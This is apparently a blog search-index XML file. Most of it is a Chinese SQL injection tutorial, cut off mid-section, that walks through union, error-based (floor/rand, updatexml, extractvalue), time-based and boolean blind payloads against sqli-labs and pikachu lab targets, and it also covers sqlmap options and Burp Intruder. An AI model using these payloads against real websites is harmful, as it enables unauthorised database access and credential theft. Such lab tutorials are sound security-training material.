<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Metasploit系列-[Kali基础]</title>
    <url>/2022/05/01/Kali%E6%B8%97%E9%80%8F/Metasploit%E7%B3%BB%E5%88%97-%5BKali%E5%9F%BA%E7%A1%80%5D%20/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Kali渗透</category>
      </categories>
  </entry>
  <entry>
    <title>WEB安全系列-[XSS跨站]</title>
    <url>/2022/04/13/WEB%E5%AE%89%E5%85%A8/WEB%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BXSS%5D/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
  </entry>
  <entry>
    <title>WEB安全系列-[SQL注入]</title>
    <url>/2022/04/13/WEB%E5%AE%89%E5%85%A8/WEB%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSQL%E6%B3%A8%E5%85%A5%5D/</url>
    <content><![CDATA[<h1><span id="sql注入介绍">SQL注入介绍</span></h1><h3><span id="前言">前言</span></h3><p>SQL注入是比较常见的网络攻击方式之一，它不是利用操作系统的BUG来实现攻击，而是针对程序员编写时的疏忽，通过SQL语句，实现无账号登录，甚至篡改数据库。</p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/1.png" alt="1"></p>
<h3><span id="sql注入的分类">SQL注入的分类</span></h3><p><strong>从注入手法分类可以分为：</strong></p>
<blockquote>
<p><strong>联合查询注入</strong></p>
<p><strong>报错型注入</strong></p>
<p><strong>布尔型注入</strong></p>
<p><strong>延时注入</strong></p>
<p><strong>堆叠注入</strong></p>
<p><strong>Cookie注入</strong></p>
<p><strong>HTTP头注入</strong></p>
<p><strong>JSON注入</strong></p>
<p><strong>POST注入</strong></p>
<p><strong>二次注入</strong></p>
<p><strong>DNS注入</strong></p>
<p><strong>宽字节注入</strong></p>
<p><strong>……</strong></p>
</blockquote>
<p><strong>从数据类型上可以分为：</strong></p>
<blockquote>
<p><strong>字符型（即输入的输入使用符号进行过滤）</strong></p>
<p><strong>数值型（即输入的输入未使用符号进行过滤）</strong></p>
</blockquote>
<p><strong>从注入位置可以分类为：</strong></p>
<blockquote>
<p><strong>GET数据（提交数据方式为GET，大多存在地址栏）</strong></p>
<p><strong>POST数据（提交数据方式为POST，大多存在输入框中）</strong></p>
<p><strong>HTTP头部（提交数据方式为HTTP头部）</strong></p>
<p><strong>cookie数据（提交数据方式为cookie）</strong></p>
</blockquote>
<h3><span id="sql注入的危害">SQL注入的危害</span></h3><p>分为两类：危害数据库里的数据、直接危害到网站的权限(需要满足条件)</p>
<ol>
<li><p>数据库信息泄露</p>
</li>
<li><p>网页篡改：登陆后台后发布恶意内容</p>
</li>
<li><p>网站挂马 : 当拿到webshell时或者获取到服务器的权限以后，可将一些网页木马挂在服务器上，去攻击别人</p>
</li>
<li><p>私自添加系统账号</p>
</li>
<li><p>读写文件获取webshell</p>
</li>
</ol>
<h3><span id="sql注入原理">SQL注入原理</span></h3><p>  SQL注入漏洞的产生需要满足以下两个条件：</p>
<ul>
<li>参数用户可控：前端传给后端的参数内容是用户可以控制的。</li>
<li>参数参与数据库操作：传入的参数直接拼接到SQL语句后，带入数据库进行相关操作。</li>
</ul>
<h3><span id="sql注入步骤">SQL注入步骤</span></h3><p><strong>1.注入点判断</strong>。</p>
<p>​        不同类别的网站注入点存在的位置也可能不一样，但其都有脱离不了一点就是与数据库进行交互，所以与数据库发生交互操作的功能点都有可能存在SQL注入，常出现注入点的位置有：新闻公告等查询处、用户注册处、用户登录处等等。</p>
<p><strong>2.判断SQL语句中的列数</strong>。</p>
<pre><code>   注入点正常实现的数据往往不是我们想要得到的数据，通常我们需要使用`union`或报错等操作，使得此注入点显示的数据是我们想要得到的，但构造我们需要的查询时必须要知道原SQL语句中的列数，否则SQL执行时会发生错误。
</code></pre>
<p><strong>3.判断SQL语句操作的回显位置</strong>。</p>
<p>​        使用<code>union</code>查询时我们需要找一个在前端显示的点，让我们查询到的数据显示出来，同样使用报错注入时也需要在前端显示我们想要得到的数据，所以需要先找到这样的一个点。</p>
<p><strong>4.构造SQL注入获取数据库指纹等</strong>。</p>
<p>​        在爆数据库内部信息时，需要先得到数据库用户名、版本、数据库名称等消息，这会对我们的后续注入有很大的帮助。例如：MySQL数据库5.0版本之后和之前的注入操作会有些许差别，另外数据库信息对我们查找对应的<code>1day</code>有很大的帮助。</p>
<p><strong>5.构造SQL语句爆数据表名</strong>。</p>
<p>​        对数据库进行爆破的最终目的是爆数据库字段值，但在爆字段值之前我们需要知道相对应的字段名和表名，因此开始正式爆破时，需要先得到数据库的表名信息。</p>
<p><strong>6.构造SQL语句爆字段名</strong>。</p>
<p>​        在拿到数据库表名信息后，需要继续爆破表中的字段值，以判断哪些字段是我们想要得到的。</p>
<p><strong>7.构造SQL语句爆字段值</strong>。</p>
<p>​        爆破的最终目的就是爆表中的字段值，再得到表名、字段名后就需要尝试爆我们想要得到的数据</p>
<h3><span id="判断注入点">判断注入点</span></h3><p><strong>判断注入点</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and 1=1 页面正常<br>and 1=2 页面错误<br><br>SELECT * FROM user WHERE id=1 and 1=1 LIMIT 0,1 正常<br>SELECT * FROM user WHERE id=1 and 1=2 LIMIT 0,1 错误<br><br>(有一个正常，整个语句都为真)<br>SELECT * FROM user WHERE id=1 or 1=1 LIMIT 0,1 正常<br>SELECT * FROM user WHERE id=1 or 1=2 LIMIT 0,1 正常<br></code></pre></td></tr></table></figure>

<p><strong>判断字段数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">order by 1,2,3,4<br></code></pre></td></tr></table></figure>



<p><strong>常用的SQL数据库函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1. version()——MySQL 版本<br>2. user()——数据库用户名<br>3. database()——数据库名<br>4. @@datadir——数据库路径<br>5. @@version_compile_os——操作系统版本<br></code></pre></td></tr></table></figure>



<h1><span id="判断sql数据库类型">判断SQL数据库类型</span></h1><p><strong>前端与数据库类型</strong><br>asp：SQL Server，Access<br>.net：SQL Server<br>php：MySQL，PostgreSQL<br>java：Oracle，MySQL</p>
<p><strong>根据端口判断</strong><br>Oracle：默认端口1521<br>SQL Server：默认端口1433<br>MySQL：默认端口3306</p>
<p><strong>根据数据库特有函数来判断</strong><br>len和length<br>len()：SQL Server 、MySQL以及db2返回长度的函数。<br>length()：Oracle和INFORMIX返回长度的函数。</p>
<p><strong>version和@@version</strong><br>version()：MySQL查询版本信息的函数<br>@@version：MySQL和SQL Server查询版本信息的函数</p>
<p><strong>substring和substr</strong><br>MySQL两个函数都可以使用<br>Oracle只可调用substr<br>SQL Server只可调用substring</p>
<p><strong>根据特殊符号进行判断</strong><br><strong>&#x2F;</strong>*  是MySQL数据库的注释符<br><strong>–</strong>  是Oracle和SQL Server支持的注释符<br><strong>; ** 是子句查询标识符，Oracle不支持多行查询，若返回错误，则说明可能是Oracle数据库<br><strong>#</strong>  是MySQL中的注释符，返回错误则说明可能不是MySQL，另外也支持– 和&#x2F;</strong>&#x2F;</p>
<h1><span id="sql注入利用">SQL注入利用</span></h1><p> <img src="/../../images/SQL%E6%B3%A8%E5%85%A5/MYSQL%E6%B3%A8%E5%85%A5.png" alt="img"> </p>
<h3><span id="union注入">UNION注入</span></h3><p> <code>union</code>操作符用于合并两个或多个SQL语句，得到<strong>联合查询结果</strong> </p>
<ol>
<li><p><strong>利用order判断字段数</strong></p>
<p>order by x(数字） 正常与错误的正常值  正确网页正常显示，错误网页报错</p>
<p>?id&#x3D;1’ order by 3–+</p>
</li>
<li><p><strong>利用 union select 联合查询，将id值设置成不成立，即可探测到可利用的字段数</strong></p>
<p>?id&#x3D;-1 union select 1,2,3 –+</p>
</li>
<li><p><strong>利用函数database(),user(),version()可以得到所探测数据库的数据库名、用户名和版本号</strong></p>
<p>?id&#x3D;-1 union select 1,database(),version() –+</p>
</li>
<li><p><strong>利用 union select 联合查询，获取表名</strong>  </p>
<p>?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’已知库名’–+</p>
</li>
<li><p><strong>利用 union select 联合查询，获取列名</strong></p>
<p>?id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’已知表名’–+</p>
</li>
<li><p><strong>利用 union select 联合查询，获取字段值</strong></p>
<p>?id&#x3D;-1’ union select 1,2,group_concat(已知字段名,’:’已知字段名) from 已知表名–+</p>
</li>
</ol>
<h3><span id="高权限注入">高权限注入</span></h3><p>​        MYSQL注入中首先要明确当前注入点权限，高权限注入时有更多的攻击手法，有的能直接进行getshell操作。其中也会遇到很多阻碍，相关防御方案也要明确，所谓知己知彼,百战不殆。不论作为攻击还是防御都需要了解其中的手法和原理，这样才是一个合格的安全工作者。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1272951/1621404478267-41dfa830-312e-42bf-a4b3-366e08be8d2c.png?x-oss-process=image/resize,w_1102/resize,w_928,limit_0" alt="img"> </p>
<p><strong>MySQL 5.x数据结构</strong></p>
<ol>
<li><p>在MySQL 5.0以上版本中，为了方便管理，默认定义了information_schema数据 库，用来存储数据库元信息，其中具有表schemata（数据库名），table（表名），columns（列名或字段名）</p>
</li>
<li><p>在schemata表中，schema_name字段用来存储数据库名</p>
</li>
<li><p>在table表中，table_schema和table_name分别用来存储数据库名和表名</p>
</li>
<li><p>在column表中，table_schema（数据库名），table_name（表名），column_name（字段名）</p>
</li>
<li><p>获取所有数据库名</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">union select 1,group_concat(schema_name),3 from information_schema.schemata<br><br></code></pre></td></tr></table></figure>

<ol start="2">
<li>获取指定数据库下的表名</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;pikachu&#x27;<br></code></pre></td></tr></table></figure>

<ol start="3">
<li>获取指定数据库指定表名下的列名信息</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">union select 1,group_concat(column_name),3 from information_schema.columns where  table_name=&#x27;users&#x27; and table_schema=&#x27;pikachu&#x27;<br></code></pre></td></tr></table></figure>

<ol start="4">
<li>获取指定列下的字段信息</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">union select 1,username,password from users  LIMIT 1,1 --+<br></code></pre></td></tr></table></figure>





<h1><span id="web漏洞类型及提交注入">WEB漏洞—类型及提交注入</span></h1><pre><code>     在真实 SQL 注入安全测试中，我们一定要先明确提交数据及提交方 法后再进行注入，其中提交数据类型和提交方法可以通过抓包分析获取， 后续安全测试中我们也必须满足同等的操作才能进行注入
</code></pre>
<h3><span id="简要明确参数类型"><strong>简要明确参数类型</strong></span></h3><p><strong>根据网站上的参数或者值来判定注入的时候是否需要考虑符号的问题</strong></p>
<p><strong>数字，字符，搜索，JSON 等</strong></p>
<h3><span id="数字x2f字符"><strong>数字&#x2F;字符</strong></span></h3><p>数字型：基本不用引号，但是也不是绝对的，数字也可以加单引号</p>
<p>字符型：一般采用单引号，但是不单止单引号 也可以是 ‘,”,%,),}等</p>
<p><strong>即使有注入也会带入单引号里，产生不了任何作用，所以我们要做的前提是先要把它的符号闭合掉</strong></p>
<p>select * from user where id &#x3D;1;</p>
<p>select * from user where name&#x3D;’xiaojun’;</p>
<p><img src="D:/my_blog/source/images/sql%25E6%25B3%25A8%25E5%2585%25A5/8.png" alt="8"></p>
<p>$name&#x3D;$_GET[‘x’];</p>
<p>$sql&#x3D;<strong>“<strong>select * from user where name&#x3D;’$name’</strong>“;</strong></p>
<p>这样的话，注入语句就被写到单引号中了，那么这条语句就没有作用了</p>
<p>?x&#x3D;xiaojun and 1&#x3D;1</p>
<p>select * from user where name&#x3D;’xiaojun and 1&#x3D;1’</p>
<p><strong>and  1&#x3D;1原始的意义是应该拼接到SQL语句中形成一个逻辑判断的情况，由于单引号的出现导致语句写到单引号里面成为一个单纯的字符串，没有了任何意义.</strong></p>
<p><strong>根据网站自身的参数的值来判断在注人的时候是否需要考虑符合的问题。</strong></p>
<p><img src="D:/my_blog/source/images/sql%25E6%25B3%25A8%25E5%2585%25A5/9.png" alt="9"></p>
<h3><span id="搜索"><strong>搜索</strong></span></h3><p>​        <strong>将数据进行搜索并进行展示，搜索符号是%，在过滤的时候要过滤单引号和百分号，不然语句全部在单引号和百分号里</strong></p>
<p>select * from user where name like ‘%xiaojun%’ </p>
<h3><span id="简要明确请求方法"><strong>简要明确请求方法</strong></span></h3><ul>
<li><p><strong>GET,POST,COOKIE,REQUEST,HTTP</strong> 头等</p>
</li>
<li><p><strong>请求方法可以通过浏览器开发者模式查看数据包的前缀</strong></p>
</li>
</ul>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/10.png" alt="10"></p>
<ul>
<li><strong>一般情况下，大数据采用POST上传方式</strong></li>
</ul>
<p><strong>不同的请求方法，请求数据，类型，大小，都不一样</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">GET产生一个TCP数据包；POST产生两个TCP数据包。<br>         对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；<br>          而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。<br>      	 GET方法无法接收POST的值<br>   在POST情况下GET的值只要在网址后面就能接收<br>   GET、POST接收单个<br>   REQUEST 全部接收，网站在访问的时候由于我们大多数是黑盒测试，不知道对方代码写法，如果对方采用REQUEST接收方式，就不需要考虑用何种方法去提交，因为用GET、POST都可以。如果对方是单一接收方式，那么在注入的时候需要用它的方法去注入。<br></code></pre></td></tr></table></figure>

<h3><span id="get和post两种基本请求方法和区别">GET和POST两种基本请求方法和区别：</span></h3><p><a href="https://www.cnblogs.com/logsharing/p/8448446.html">https://www.cnblogs.com/logsharing/p/8448446.html</a></p>
<h3><span id="干扰符号">干扰符号</span></h3><p> SQL 语句干扰符号：’,”,%,),}等，具体需看写法</p>
<p>Less-1为例：</p>
<ol>
<li><p><a href="http://127.0.0.1/Less-1/?id=1&#39;">http://127.0.0.1/Less-1/?id=1&#39;</a>  and 1&#x3D;1</p>
<p>报错语句： SELECT * FROM users WHERE id&#x3D;’1’  and 1&#x3D;1’ LIMIT 0,1 </p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/11.png" alt="11"></p>
</li>
<li><p>正确的SQL语句：<a href="http://127.0.0.1/Less-1/?id=1&#39;">http://127.0.0.1/Less-1/?id=1&#39;</a>  and ‘1’&#x3D;’1</p>
</li>
</ol>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/12.png" alt="12"></p>
<ol start="3">
<li>当然，这种方法显得麻烦，直接使用注释也可以起到同样的效果</li>
</ol>
<p>–+负责把后面的单引号注释掉</p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/13.png" alt="13"></p>
<h3><span id="post注入"><strong>POST注入</strong>：</span></h3><h3><span id="cookie注入">COOKIE注入：</span></h3><h3><span id="http头注入">HTTP头注入：</span></h3><h3><span id="json注入相关知识">JSON注入相关知识</span></h3><p>a. 简介</p>
<p>JSON 是存储和交换文本信息的语法，是轻量级的文本数据交换格式。类似xml，但JSON 比 XML 更小、更快，更易解析。所以现在接口数据传输都采用json方式进行。JSON 文本的 MIME 类型是 “application&#x2F;json”</p>
<p> JSON语法</p>
<p>■数据在名称&#x2F;值对中</p>
<p>■数据由逗号分隔</p>
<p>■大括号保存对象</p>
<p>■中括号保存数组</p>
<p>JSON值</p>
<p>■数字（整数或浮点数） {“age”:30 }</p>
<p>■字符串（在双引号中） {“uname”:”yang”}</p>
<p>■逻辑值（true 或 false） {“flag”:true }</p>
<p>■数组（在中括号中）{“sites”:[{“name”:”yang”},{“name”:”ming”}]}</p>
<p>■对象（在大括号中）JSON 对象在大括号（{}）中书写：</p>
<p>■null  { “runoob”:null }</p>
<p>d. JSON代码格式</p>
<h3><span id="sqlmap简单使用">SQLMap简单使用</span></h3><p>● –is-dba 当前用户权限（是否为root权限）<br>● –dbs 所有数据库<br>● –current-db 网站当前数据库<br>● –users 所有数据库用户<br>● –current-user 当前数据库用户<br>● –random-agent 构造随机user-agent<br>● –passwords 数据库密码<br>● –proxy <a href="http://local:8080/">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理<br>● –time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</p>
<p><strong>常用方法：</strong></p>
<p><img src="D:/my_blog/source/images/sql%25E6%25B3%25A8%25E5%2585%25A5/14.png" alt="14"></p>
<p><strong>详细SQLMap使用：</strong></p>
<h1><span id="web漏洞查询方式及盲注">WEB漏洞—查询方式及盲注</span></h1><p><strong>前言</strong></p>
<p>​            当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL语句大概写法也能更好的选择对应的注入语句</p>
<p><strong>涉及知识点：</strong></p>
<ul>
<li><p><strong>报错盲注</strong></p>
</li>
<li><p><strong>延迟盲注</strong></p>
</li>
<li><p><strong>布尔盲注</strong></p>
</li>
</ul>
<h3><span id="ascci码表">ASCCI码表</span></h3><p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/ascci.png" alt="1646537964629"></p>
<p><strong>SQL语句</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs sqlite">select 查询数据<br>在网站应用中进行数据显示查询效果<br>例： select * from news wher id=$id<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mssql">insert 插入数据<br><br>在网站应用中进行用户注册添加等操作<br>例：insert into news(id,url,text) values(2,&#x27;x&#x27;,&#x27;$t&#x27;)<br></code></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">delete</span> 删除数据<br><br>后台管理里面删除文章删除用户等操作<br>例：<span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>$id<br></code></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> 更新数据<br><br>会员或后台中心数据同步或缓存等操作<br>例：<span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> pwd<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$p&#x27;</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">and</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> 排列数据<br><br>一般结合表名或列名进行数据排序操作<br>例：<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> $id<br>例：<span class="hljs-keyword">select</span> id,name,price <span class="hljs-keyword">from</span> news <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> $<span class="hljs-keyword">order</span><br></code></pre></td></tr></table></figure>



<h3><span id="报错盲注">报错盲注</span></h3><p>发现注入漏洞时，构造sql语句不回显类容，但是会打印报错语句</p>
<p>目的：让错误信息返回数据库中的类容</p>
<p>原理分析：</p>
<ul>
<li><p><strong>floor()</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">首先我们探讨一下是什么导致了报错，真是floor（）这个函数吗？<br>floor这个函数，它的作用是返回参数的最小整数。也就是向下取整（2.2 ==》）。很显然这个函数不可能导致报错。再者count（*）就是一个计数的函数，也不是。其实真正发生作用的是第二层括号里面的代码<br><br>select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x<br><br>Mysql在执行 select count() from XXX group by x这一类语句时会先创建一个虚拟表，然后在虚拟表中插入数据，key是主键，不可重复。记住，不可重复，这个是重点。key就是后面那个x<br>假设我们现在有这样一个表<br></code></pre></td></tr></table></figure>

<p>使用 group by 对一些rand()函数进行操作时会返回重复键</p>
<p>（duplicate key）错误</p>
<p>向下取整：省略小数点后的数，不会四舍五入</p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/14.png" alt="1646477221722"></p>
<p>rand:产生尾随机数的序列，随机产生一个0-1之间的数</p>
<p><img src="D:/my_blog/source/images/%25E6%258A%25A5%25E9%2594%2599/2" alt="1646469346588"></p>
</li>
</ul>
<p>不加参数每次执行都是不一样的结果，加参数每次执行都是一样的结果</p>
<ul>
<li><p>count (*)</p>
<p>对数据计数</p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/3233.png" alt="1646475156026"></p>
</li>
<li><p>group by </p>
<p>分组</p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/4.png" alt="1646475534047"></p>
</li>
</ul>
<p><strong>count(<em>)和group by 特性：count(</em>)和group by在执行的时候会创建虚拟表，虚拟表用来处理数据，计数</strong></p>
<ol>
<li>获取数据库名</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and(select 1 from(select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/5.png" alt="1646480666891"></p>
<ol start="2">
<li>爆表名</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select 1 from(select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/6..png" alt="1646480854172"></p>
<ol start="3">
<li>爆字段</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select 1 from (select count(*),concat((select (column_name) from information_schema.columns where table_schema=database() and table_name= &#x27;users&#x27; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/7.png" alt="1646481042045"></p>
<ol start="4">
<li>爆字段数据</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select 1 from (select count(*),concat((select username from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/8.png" alt="1646481199468"></p>
<ul>
<li><strong>updatexml()和extractvalue()报错注入</strong></li>
<li>截取的数据最多显示32位，超过32位使用分段显示</li>
</ul>
<p><strong>xpath语法错误，通过爆语法错误，顺便第二个参数里面的参数类容也爆出来，只要让第二个参数不符合xpath语法就可以报错</strong></p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/1646536236587.png" alt="1646536236587"></p>
<p> <strong>updatexml：</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and updatexml(1,concat(&quot;~&quot;,(database())),0)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/9.png" alt="1646534166611"></p>
<p>获取表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),0x7e),1))--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/1646536736551.png" alt="1646536736551"></p>
<p>列，字段，数据….省略</p>
<p><strong>extractvalue：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and extractvalue(null,concat(0x7e,(select user()),0x7e));--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/1660.png" alt="1646534259127"></p>
<h3><span id="延迟盲注"><strong>延迟盲注</strong></span></h3><p>判断目标是否真的存在注入点，我们可以加单引号，双引号，减号 等干扰字符来确定输入的参数是否能代入数据库中，但是如果不管输入什么不管怎么闭合，前端页面都是显示正常，那么这时候时间盲注应运而生</p>
<p>来到sqlilabs的第九关，当我们在url上输入任何参数返回页面都返回正常</p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/62611.png" alt="1646459336591"></p>
<p>时间盲注的利用过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and if(1=1,sleep(5),1)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/212.png" alt="1646459863671"></p>
<ol start="2">
<li><p>每一个字符都对应一个字符，我们需要ASCII码进行比较通过它的真假来判断截取的字符对应的是什么</p>
<p>通过ASCII函数来判断</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and if ((ascii(mid((select version()),1,1))=53),sleep(5),1)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/214.png" alt="1646467884085"></p>
<h3><span id="布尔盲注"><strong>布尔盲注</strong></span></h3><p>目标网站即使存在注入，即使存在注入，也没有任何的回显，不管怎样改变参数，有么就是页面没有变化，要么就是页面啥也没有，对于这种情况，我们可以通过布尔盲注要么返回要么不返回的两种状态的改变来判断我们想要的结果</p>
<p>例如：语句是被带入到数据库执行，但是在页面上看不到任何的信息</p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/115.png" alt="1646236190924"></p>
<p><strong>开始注入演示</strong>：</p>
<p>函数：</p>
<ul>
<li>判断长度函数：length</li>
<li>判断数据库名&gt;&#x3D;&lt;某值</li>
<li>将字符传换成Ascii</li>
</ul>
<ol>
<li>通过length函数来判断数据库名长度</li>
</ol>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/9916.png" alt="1646237125455"></p>
<ol start="2">
<li>获取数据库名字</li>
</ol>
<p>substr(database(),1,a)从数据库名字的第一个开始取第a个</p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/1217..png" alt="1646237780843"></p>
<p>3.使用ASCLL将字符转换成数字比较</p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/2119.png" alt="1646238250232"></p>
<ol start="3">
<li>获取表</li>
</ol>
<ul>
<li><p>判断表的数量：count,information_schema</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select count(*) from information_schema.tables where table_schema=database())=4--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/3618.png" alt="1646283281839"></p>
</li>
<li><p>获取表名字的长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=5--+<br></code></pre></td></tr></table></figure>

<p><strong>注意：这里的limit 0,1排序是从0开始的</strong></p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/12320.png" alt="1646284501803"></p>
</li>
<li><p>获取表名字</p>
<p>and (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema&#x3D;database() limit 0,1)&#x3D;101–+</p>
<p><strong>注：获取完一个表名，可以设置limit切换下个表</strong></p>
</li>
</ul>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/2521.png" alt="1646285143209"></p>
<h3><span id="burp获取表名信息">Burp获取表名信息</span></h3><p>在实际的 WEB渗透中如果目标存在布尔注入，我们在url地址上一个个的测试是非常的麻烦，效率很低的。，所以使用<strong>Burp</strong>的<strong>Intruder</strong>来猜解信息是一个不错的选择</p>
<p>使用Burp获取表名：</p>
<ol>
<li>先抓一个包，然后发送给给Intruder模块</li>
</ol>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/22.png" alt="1646384318158"></p>
<ol start="2">
<li>Intruder配置</li>
</ol>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/23.png" alt="1646384375603"></p>
<ol start="3">
<li>设置变量符号</li>
</ol>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/24.png" alt="1646384978480"></p>
<ol start="4">
<li>设定类型以及范围</li>
</ol>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/25.png" alt="1646385182573"></p>
<ol start="5">
<li>设定好后就可以开始攻击了</li>
</ol>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/26.png" alt="1646385233286"></p>
<ol start="6">
<li><p>开始扫描后，Burp会从0-127依次尝试，当页面回显正常，就会被burp识别，一个个的尝试，最终获取完整表名</p>
<p><strong>注：如果找不到，点击length排序一下</strong></p>
</li>
</ol>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/27.png" alt="1646389674912"></p>
<ul>
<li>获取列名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select count(column_name)  from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)=3--+<br><br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/28.png" alt="1646391486413"></p>
<ul>
<li>获取列名长度</li>
</ul>
